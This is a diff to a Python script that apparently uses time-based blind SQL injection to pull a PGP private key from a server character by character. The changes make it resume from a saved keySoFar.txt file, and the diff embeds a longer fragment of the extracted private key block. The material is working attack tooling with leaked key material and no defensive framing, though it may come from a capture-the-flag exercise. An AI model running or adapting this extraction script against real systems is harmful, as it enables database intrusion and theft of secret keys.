@@ -11,7 +11,13 @@ injectionEnd = ";--"
 
 maxDelay = 0.2
 
-keySoFar = "-----BEGIN PGP PRIVATE KEY BLOCK-----\nVersion: GnuPG v1\n\nlQOYBFcDxHUBCAC6pKKopQL1d39769zBTcoAS/it4rjies8sEmqlw4Yl/CfWMLPr\nrzsL0wk/gdsWDDs42aK0pgpWbo/2YrbTHyf1uV0ucXO6jLy7xfwBQoenLWiApgYv\n1LecOc8GX+GK9dkRYt5iBctDnBLQ"
+keySoFar = """-----BEGIN PGP PRIVATE KEY BLOCK-----
+Version: GnuPG v1
+
+lQOYBFcDxHUBCAC6pKKopQL1d39769zBTcoAS/it4rjies8sEmqlw4Yl/CfWMLPr
+rzsL0wk/gdsWDDs42aK0pgpWbo/2YrbTHyf1uV0ucXO6jLy7xfwBQoenLWiApgYv
+1LecOc8GX+GK9dkRYt5iBctDnB/5tIPMbu6LCcfNECZlO6l8EiihZXB3SYMCTKwY
+uW6rx66ac8VAcs0AfYkQgQh8lFtv"""
 
 import urllib as url
 import time
@@ -49,6 +55,9 @@ def findNextChar(currentKey,tries=0):
         print("Cant find next char in this key:\n"+currentKey+"\ntrying again\n")
         if(tries>10):
             print("Tried 10 times and failed, current key is:\n"+currentKey)
+            f = open('keySoFar.txt','w')
+            f.write(currentKey)
+            f.close()
         else:
             return findNextChar(currentKey,tries=tries+1)
     else:
@@ -58,7 +67,9 @@ def findNextChar(currentKey,tries=0):
     
 
 def main():
-    key = keySoFar;
+    f = open('keySoFar.txt','r')
+    key = f.read()
+    f.close()
     while True:
         key = findNextChar(key)
     return
